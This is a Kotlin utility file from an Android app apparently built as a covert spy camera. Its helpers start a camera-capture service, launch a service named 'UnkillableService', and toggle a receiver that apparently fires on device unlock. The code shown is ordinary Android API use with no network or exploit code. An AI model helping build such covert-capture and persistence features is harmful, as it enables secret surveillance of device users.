package com.spylab.spycam.util

import android.app.ActivityManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.spylab.spycam.remote.CameraService
import com.spylab.spycam.remote.UnkillableService
import com.spylab.spycam.remote.UnlockReceiver


/**
 * @author a.hatrus.
 */

object ProcessHelper {

    fun isAppRunning(context: Context, packageName: String): Boolean {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val procInfos = activityManager.runningAppProcesses
        procInfos?.filter { it.processName == packageName }?.forEach { return true }
        return false
    }

    fun startCameraCapture(context: Context) {
        val intent = Intent(context, CameraService::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startService(intent)
    }

    fun startRemoteProcess(context: Context) {
        val intent = Intent(context, UnkillableService::class.java)
        intent.putExtra("Command", "start_process")
        context.startService(intent)
    }

    fun registerReceiver(context: Context) {
        val pm = context.packageManager
        val compName = ComponentName(context.applicationContext,
                UnlockReceiver::class.java)
        pm.setComponentEnabledSetting(
                compName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP)
    }

    fun unregisterReceiver(context: Context) {
        val pm = context.packageManager
        val compName = ComponentName(context.applicationContext,
                UnlockReceiver::class.java)
        pm.setComponentEnabledSetting(
                compName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP)
    }
}